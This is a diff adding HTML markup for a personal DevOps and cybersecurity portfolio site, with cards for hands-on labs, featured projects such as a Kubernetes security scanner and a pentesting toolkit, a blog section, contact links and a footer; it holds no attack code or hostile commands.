+                            <div class="flex items-center space-x-4 text-sm text-gray-500">
+                                <span class="flex items-center">
+                                    <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                    </svg>
+                                    15 min read
+                                </span>
+                                <span class="flex items-center">
+                                    <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                    </svg>
+                                    Hands-on
+                                </span>
+                                <span class="text-secondary font-mono">Click to view →</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Lab 2: Kubernetes Security -->
+                <div class="bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl overflow-hidden card-hover cursor-pointer" onclick="openModal('lab-k8s-security')">
+                    <div class="md:flex">
+                        <div class="md:w-1/3 bg-gradient-to-br from-secondary/20 to-primary/20 p-8 flex items-center justify-center">
+                            <svg class="w-32 h-32 text-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+                            </svg>
+                        </div>
+                        <div class="p-8 md:w-2/3">
+                            <div class="flex items-center space-x-2 mb-4">
+                                <span class="bg-secondary/20 text-secondary px-3 py-1 rounded font-mono text-sm">Security</span>
+                                <span class="bg-primary/20 text-primary px-3 py-1 rounded font-mono text-sm">Kubernetes</span>
+                            </div>
+                            <h3 class="text-2xl font-mono font-semibold text-gray-100 mb-4">
+                                Hardening Kubernetes Clusters: Security Lab
+                            </h3>
+                            <p class="text-gray-400 leading-relaxed mb-4">
+                                Practical guide to implementing Kubernetes security best practices. Covers RBAC, Pod Security Standards,
+                                Network Policies, and runtime security monitoring.
+                            </p>
+                            <div class="flex items-center space-x-4 text-sm text-gray-500">
+                                <span class="flex items-center">
+                                    <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                    </svg>
+                                    20 min read
+                                </span>
+                                <span class="flex items-center">
+                                    <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                    </svg>
+                                    Hands-on
+                                </span>
+                                <span class="text-secondary font-mono">Click to view →</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Lab 3: Web Pentesting -->
+                <div class="bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl overflow-hidden card-hover cursor-pointer" onclick="openModal('lab-pentesting')">
+                    <div class="md:flex">
+                        <div class="md:w-1/3 bg-gradient-to-br from-red-500/20 to-orange-500/20 p-8 flex items-center justify-center">
+                            <svg class="w-32 h-32 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
+                            </svg>
+                        </div>
+                        <div class="p-8 md:w-2/3">
+                            <div class="flex items-center space-x-2 mb-4">
+                                <span class="bg-red-500/20 text-red-500 px-3 py-1 rounded font-mono text-sm">Pentesting</span>
+                                <span class="bg-orange-500/20 text-orange-500 px-3 py-1 rounded font-mono text-sm">OWASP</span>
+                            </div>
+                            <h3 class="text-2xl font-mono font-semibold text-gray-100 mb-4">
+                                Web Application Penetration Testing Lab
+                            </h3>
+                            <p class="text-gray-400 leading-relaxed mb-4">
+                                End-to-end penetration testing methodology on a vulnerable web application.
+                                Covers reconnaissance, vulnerability discovery, exploitation, and reporting.
+                            </p>
+                            <div class="flex items-center space-x-4 text-sm text-gray-500">
+                                <span class="flex items-center">
+                                    <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                    </svg>
+                                    25 min read
+                                </span>
+                                <span class="flex items-center">
+                                    <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                    </svg>
+                                    Hands-on
+                                </span>
+                                <span class="text-secondary font-mono">Click to view →</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Projects Section -->
+    <section id="projects" class="py-20 px-4 sm:px-6 lg:px-8">
+        <div class="max-w-7xl mx-auto">
+            <div class="mb-12">
+                <h2 class="text-4xl sm:text-5xl font-mono font-bold text-gray-100 mb-2">
+                    <span class="text-secondary">#</span> Featured Projects
+                </h2>
+                <div class="h-1 w-24 bg-gradient-to-r from-primary to-secondary"></div>
+            </div>
+
+            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
+                <!-- Project 1 -->
+                <div class="bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl overflow-hidden card-hover cursor-pointer">
+                    <div class="bg-gradient-to-br from-primary/20 to-secondary/20 p-6 border-b border-primary/20">
+                        <svg class="w-12 h-12 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"/>
+                        </svg>
+                    </div>
+                    <div class="p-6 space-y-4">
+                        <h3 class="text-2xl font-mono font-semibold text-gray-100">LocalStack CI/CD Pipeline</h3>
+                        <p class="text-gray-400 leading-relaxed">
+                            Complete CI/CD infrastructure using LocalStack, Terraform, and Ansible for local AWS development and testing. Includes automated deployment workflows.
+                        </p>
+                        <div class="flex flex-wrap gap-2">
+                            <span class="bg-dark-700 text-primary px-3 py-1 rounded text-xs font-mono">LocalStack</span>
+                            <span class="bg-dark-700 text-secondary px-3 py-1 rounded text-xs font-mono">Terraform</span>
+                            <span class="bg-dark-700 text-primary px-3 py-1 rounded text-xs font-mono">Ansible</span>
+                            <span class="bg-dark-700 text-secondary px-3 py-1 rounded text-xs font-mono">Docker</span>
+                        </div>
+                        <div class="flex items-center justify-between pt-4 border-t border-dark-700">
+                            <a href="#" class="text-secondary hover:text-secondary/80 font-mono text-sm transition-colors duration-200">View Details →</a>
+                            <a href="#" class="text-gray-400 hover:text-gray-300 transition-colors duration-200">
+                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                                </svg>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Project 2 -->
+                <div class="bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl overflow-hidden card-hover cursor-pointer">
+                    <div class="bg-gradient-to-br from-secondary/20 to-primary/20 p-6 border-b border-secondary/20">
+                        <svg class="w-12 h-12 text-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+                        </svg>
+                    </div>
+                    <div class="p-6 space-y-4">
+                        <h3 class="text-2xl font-mono font-semibold text-gray-100">Kubernetes Security Scanner</h3>
+                        <p class="text-gray-400 leading-relaxed">
+                            Automated security scanning tool for Kubernetes clusters. Detects misconfigurations, vulnerabilities, and compliance issues with detailed reporting.
+                        </p>
+                        <div class="flex flex-wrap gap-2">
+                            <span class="bg-dark-700 text-secondary px-3 py-1 rounded text-xs font-mono">Kubernetes</span>
+                            <span class="bg-dark-700 text-primary px-3 py-1 rounded text-xs font-mono">Python</span>
+                            <span class="bg-dark-700 text-secondary px-3 py-1 rounded text-xs font-mono">Security</span>
+                        </div>
+                        <div class="flex items-center justify-between pt-4 border-t border-dark-700">
+                            <a href="#" class="text-secondary hover:text-secondary/80 font-mono text-sm transition-colors duration-200">View Details →</a>
+                            <a href="#" class="text-gray-400 hover:text-gray-300 transition-colors duration-200">
+                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                                </svg>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Project 3 -->
+                <div class="bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl overflow-hidden card-hover cursor-pointer">
+                    <div class="bg-gradient-to-br from-primary/20 to-secondary/20 p-6 border-b border-primary/20">
+                        <svg class="w-12 h-12 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"/>
+                        </svg>
+                    </div>
+                    <div class="p-6 space-y-4">
+                        <h3 class="text-2xl font-mono font-semibold text-gray-100">Infrastructure Automation Framework</h3>
+                        <p class="text-gray-400 leading-relaxed">
+                            Multi-cloud infrastructure automation framework using Terraform modules and Ansible playbooks for consistent deployments across AWS, Azure, and GCP.
+                        </p>
+                        <div class="flex flex-wrap gap-2">
+                            <span class="bg-dark-700 text-primary px-3 py-1 rounded text-xs font-mono">Terraform</span>
+                            <span class="bg-dark-700 text-secondary px-3 py-1 rounded text-xs font-mono">Ansible</span>
+                            <span class="bg-dark-700 text-primary px-3 py-1 rounded text-xs font-mono">Multi-Cloud</span>
+                        </div>
+                        <div class="flex items-center justify-between pt-4 border-t border-dark-700">
+                            <a href="#" class="text-secondary hover:text-secondary/80 font-mono text-sm transition-colors duration-200">View Details →</a>
+                            <a href="#" class="text-gray-400 hover:text-gray-300 transition-colors duration-200">
+                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                                </svg>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Project 4 -->
+                <div class="bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl overflow-hidden card-hover cursor-pointer">
+                    <div class="bg-gradient-to-br from-secondary/20 to-primary/20 p-6 border-b border-secondary/20">
+                        <svg class="w-12 h-12 text-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
+                        </svg>
+                    </div>
+                    <div class="p-6 space-y-4">
+                        <h3 class="text-2xl font-mono font-semibold text-gray-100">Penetration Testing Toolkit</h3>
+                        <p class="text-gray-400 leading-relaxed">
+                            Custom penetration testing toolkit with automated reconnaissance, vulnerability scanning, and exploitation modules. Built for ethical hacking engagements.
+                        </p>
+                        <div class="flex flex-wrap gap-2">
+                            <span class="bg-dark-700 text-secondary px-3 py-1 rounded text-xs font-mono">Python</span>
+                            <span class="bg-dark-700 text-primary px-3 py-1 rounded text-xs font-mono">Security</span>
+                            <span class="bg-dark-700 text-secondary px-3 py-1 rounded text-xs font-mono">Pentesting</span>
+                        </div>
+                        <div class="flex items-center justify-between pt-4 border-t border-dark-700">
+                            <a href="#" class="text-secondary hover:text-secondary/80 font-mono text-sm transition-colors duration-200">View Details →</a>
+                            <a href="#" class="text-gray-400 hover:text-gray-300 transition-colors duration-200">
+                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                                </svg>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Project 5 -->
+                <div class="bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl overflow-hidden card-hover cursor-pointer">
+                    <div class="bg-gradient-to-br from-primary/20 to-secondary/20 p-6 border-b border-primary/20">
+                        <svg class="w-12 h-12 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"/>
+                        </svg>
+                    </div>
+                    <div class="p-6 space-y-4">
+                        <h3 class="text-2xl font-mono font-semibold text-gray-100">Monitoring & Observability Stack</h3>
+                        <p class="text-gray-400 leading-relaxed">
+                            Complete monitoring solution with Prometheus, Grafana, and ELK stack. Custom dashboards for infrastructure metrics, logs, and application performance.
+                        </p>
+                        <div class="flex flex-wrap gap-2">
+                            <span class="bg-dark-700 text-primary px-3 py-1 rounded text-xs font-mono">Prometheus</span>
+                            <span class="bg-dark-700 text-secondary px-3 py-1 rounded text-xs font-mono">Grafana</span>
+                            <span class="bg-dark-700 text-primary px-3 py-1 rounded text-xs font-mono">ELK</span>
+                        </div>
+                        <div class="flex items-center justify-between pt-4 border-t border-dark-700">
+                            <a href="#" class="text-secondary hover:text-secondary/80 font-mono text-sm transition-colors duration-200">View Details →</a>
+                            <a href="#" class="text-gray-400 hover:text-gray-300 transition-colors duration-200">
+                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                                </svg>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Project 6 -->
+                <div class="bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl overflow-hidden card-hover cursor-pointer">
+                    <div class="bg-gradient-to-br from-secondary/20 to-primary/20 p-6 border-b border-secondary/20">
+                        <svg class="w-12 h-12 text-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/>
+                        </svg>
+                    </div>
+                    <div class="p-6 space-y-4">
+                        <h3 class="text-2xl font-mono font-semibold text-gray-100">GitOps Deployment Pipeline</h3>
+                        <p class="text-gray-400 leading-relaxed">
+                            GitOps-based deployment pipeline using ArgoCD and Flux. Automated deployments with Git as the single source of truth for declarative infrastructure.
+                        </p>
+                        <div class="flex flex-wrap gap-2">
+                            <span class="bg-dark-700 text-secondary px-3 py-1 rounded text-xs font-mono">GitOps</span>
+                            <span class="bg-dark-700 text-primary px-3 py-1 rounded text-xs font-mono">ArgoCD</span>
+                            <span class="bg-dark-700 text-secondary px-3 py-1 rounded text-xs font-mono">Kubernetes</span>
+                        </div>
+                        <div class="flex items-center justify-between pt-4 border-t border-dark-700">
+                            <a href="#" class="text-secondary hover:text-secondary/80 font-mono text-sm transition-colors duration-200">View Details →</a>
+                            <a href="#" class="text-gray-400 hover:text-gray-300 transition-colors duration-200">
+                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                                </svg>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Blog Section -->
+    <section id="blog" class="py-20 px-4 sm:px-6 lg:px-8 bg-dark-800/30">
+        <div class="max-w-7xl mx-auto">
+            <div class="mb-12">
+                <h2 class="text-4xl sm:text-5xl font-mono font-bold text-gray-100 mb-2">
+                    <span class="text-secondary">#</span> Recent Blog Posts
+                </h2>
+                <div class="h-1 w-24 bg-gradient-to-r from-primary to-secondary"></div>
+            </div>
+
+            <!-- Blog posts will be loaded dynamically -->
+            <div id="blog-posts-container" class="grid md:grid-cols-2 gap-8">
+                <!-- Loading indicator -->
+                <div class="col-span-2 text-center py-12">
+                    <div class="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-primary"></div>
+                    <p class="text-gray-400 mt-4 font-mono">Loading blog posts...</p>
+                </div>
+            </div>
+
+            <div class="text-center mt-12">
+                <a href="#" class="inline-block bg-dark-800/80 backdrop-blur-sm hover:bg-dark-700 text-gray-100 px-8 py-4 rounded-lg font-mono border border-secondary/40 hover:border-secondary transition-all duration-200 cursor-pointer">
+                    View All Posts →
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact" class="py-20 px-4 sm:px-6 lg:px-8">
+        <div class="max-w-4xl mx-auto text-center">
+            <div class="mb-12">
+                <h2 class="text-4xl sm:text-5xl font-mono font-bold text-gray-100 mb-2">
+                    <span class="text-secondary">#</span> Get In Touch
+                </h2>
+                <div class="h-1 w-24 bg-gradient-to-r from-primary to-secondary mx-auto"></div>
+            </div>
+
+            <div class="bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-2xl p-8 space-y-6">
+                <p class="text-xl text-gray-300 leading-relaxed">
+                    Interested in collaborating on DevOps or cybersecurity projects?
+                    Let's connect and build something secure and scalable together.
+                </p>
+
+                <div class="grid md:grid-cols-3 gap-6 pt-6">
+                    <a href="mailto:huutai.network@gmail.com" class="bg-dark-700/50 hover:bg-dark-700 border border-primary/20 hover:border-primary/40 rounded-xl p-6 transition-all duration-200 cursor-pointer">
+                        <svg class="w-8 h-8 text-primary mx-auto mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/>
+                        </svg>
+                        <h3 class="text-gray-100 font-mono font-semibold mb-1">Email</h3>
+                        <p class="text-gray-400 text-sm font-mono">huutai.network@gmail.com</p>
+                    </a>
+
+                    <a href="https://github.com/0xt4i" target="_blank" class="bg-dark-700/50 hover:bg-dark-700 border border-secondary/20 hover:border-secondary/40 rounded-xl p-6 transition-all duration-200 cursor-pointer">
+                        <svg class="w-8 h-8 text-secondary mx-auto mb-3" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                        </svg>
+                        <h3 class="text-gray-100 font-mono font-semibold mb-1">GitHub</h3>
+                        <p class="text-gray-400 text-sm font-mono">@0xT4I</p>
+                    </a>
+
+                    <a href="https://linkedin.com/in/0xt4i" target="_blank" class="bg-dark-700/50 hover:bg-dark-700 border border-primary/20 hover:border-primary/40 rounded-xl p-6 transition-all duration-200 cursor-pointer">
+                        <svg class="w-8 h-8 text-primary mx-auto mb-3" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+                        </svg>
+                        <h3 class="text-gray-100 font-mono font-semibold mb-1">LinkedIn</h3>
+                        <p class="text-gray-400 text-sm font-mono">Tai Huu Nguyen</p>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-dark-800 border-t border-primary/10 py-12 px-4 sm:px-6 lg:px-8">
+        <div class="max-w-7xl mx-auto">
+            <div class="grid md:grid-cols-4 gap-8 mb-8">
+                <div>
+                    <div class="flex items-center space-x-2 mb-4">
+                        <img src="181613976.png" alt="0xT4I Logo" class="w-10 h-10">
+                        <span class="text-xl font-mono font-semibold text-primary glow-purple">0xT4I</span>
+                    </div>
+                    <p class="text-gray-400 text-sm">
+                        DevOps Engineer & Cyber Security Specialist
+                    </p>
+                </div>
+                <div>
+                    <h4 class="font-mono font-semibold text-gray-100 mb-4">Navigation</h4>
+                    <ul class="space-y-2 text-sm text-gray-400">
+                        <li><a href="#about" class="hover:text-secondary transition-colors duration-200">About</a></li>
+                        <li><a href="#projects" class="hover:text-secondary transition-colors duration-200">Projects</a></li>
+                        <li><a href="#blog" class="hover:text-secondary transition-colors duration-200">Blog</a></li>
+                        <li><a href="#contact" class="hover:text-secondary transition-colors duration-200">Contact</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-mono font-semibold text-gray-100 mb-4">Resources</h4>
+                    <ul class="space-y-2 text-sm text-gray-400">
+                        <li><a href="#" class="hover:text-secondary transition-colors duration-200">Documentation</a></li>
+                        <li><a href="#" class="hover:text-secondary transition-colors duration-200">Tutorials</a></li>
+                        <li><a href="#" class="hover:text-secondary transition-colors duration-200">Security Tools</a></li>
+                        <li><a href="#" class="hover:text-secondary transition-colors duration-200">Case Studies</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-mono font-semibold text-gray-100 mb-4">Connect</h4>
+                    <ul class="space-y-2 text-sm text-gray-400">
+                        <li><a href="https://github.com/0xt4i" class="hover:text-secondary transition-colors duration-200">GitHub</a></li>
+                        <li><a href="https://linkedin.com/in/0xt4i" class="hover:text-secondary transition-colors duration-200">LinkedIn</a></li>
+                        <li><a href="https://twitter.com/0xt4i" class="hover:text-secondary transition-colors duration-200">Twitter</a></li>
+                        <li><a href="mailto:huutai.network@gmail.com" class="hover:text-secondary transition-colors duration-200">Email</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="border-t border-dark-700 pt-8">
+                <div class="flex flex-col md:flex-row justify-between items-center">
+                    <p class="text-gray-400 text-sm font-mono mb-4 md:mb-0">
+                        © 2024 0xT4I. All rights reserved.
+                    </p>
+                    <div class="flex items-center space-x-4">
+                        <span class="text-gray-500 font-mono text-sm">root@0xT4I:~#</span>
+                        <span class="text-secondary font-mono text-sm terminal-cursor">Securing the digital world</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Modal Containers -->
+    <!-- AWS Certification Modal -->
+    <div id="aws-cert" class="modal">
+        <div class="modal-content p-8 m-4">
+            <div class="flex justify-between items-start mb-6">
+                <h2 class="text-3xl font-mono font-bold text-primary glow-purple">AWS Solutions Architect Journey</h2>
